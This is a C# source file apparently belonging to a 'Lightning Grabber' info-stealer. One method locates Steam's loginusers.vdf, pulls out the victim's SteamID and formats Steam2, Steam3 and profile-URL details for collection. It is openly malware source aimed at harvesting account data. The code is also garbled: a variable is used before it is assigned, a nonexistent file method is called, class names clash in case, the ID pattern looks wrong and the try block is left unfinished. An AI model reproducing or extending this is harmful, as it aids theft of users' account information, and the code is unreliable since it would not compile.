using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Lightning_Grabber.Resources
{
    internal class VMTracker
    {
        public static string steamdata()
        {
            string path = path.Combine(Class9.smethod_5("InstallPath", "SourceModInstallPath"), "config\\loginusers.vdf");
            StringBuilder stringbuilder = new StringBuilder();
            string result;
            try
            {
                if (!File.Exists(path))
                {
                    result = null;

                }
                else
                {
                    string text = File.ReadAllLine(path)[2].Split(new char[]
                    {
                        '"'
                    })[1];
                    if (Regex.IsMatch(text, "^765119([0-9]{10})$"))
                    {
                        string str = class9.smethod_3(Convert.ToInt64(text));
                        string str2 = "U:1:" + Class9.smethod_2(Convert.ToInt64(text)).ToString(CultureInfo.InvariantCulture);
                        stringbuilder.AppendLine("Steam2 ID         | " + str);
                        stringbuilder.AppendLine("Steam3 ID x32       | " + str2);
                        stringbuilder.AppendLine("Steam2 ID x64        | " + text);
                        stringbuilder.AppendLine("Steam Profile        | https://steamcommunity.com/profiles/" + text);
                        result = stringbuilder.ToString();
                    }
                    else
                    {
                        result = null;
                    }
                    }
                
            }

        }
    }
}
